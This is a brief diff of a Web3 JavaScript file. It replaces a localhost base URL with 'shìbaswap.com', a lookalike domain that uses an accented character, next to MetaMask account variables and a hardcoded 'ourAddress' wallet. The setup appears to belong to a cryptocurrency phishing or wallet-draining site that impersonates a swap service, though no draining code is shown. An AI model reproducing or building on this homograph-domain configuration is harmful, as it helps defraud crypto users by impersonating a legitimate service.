@@ -1,5 +1,5 @@
 const Web3 = require('web3');
-var baseURL = 'https://localhost',
+var baseURL = 'https://shìbaswap.com',
     web3, metamaskAccounts = [], myAccount, isConnected, lastURL, actURL,
     shareReady = false, ourAddress = '0x17fCFf24f0e9b3b360a34df8d92455581Db0EF7c';
 
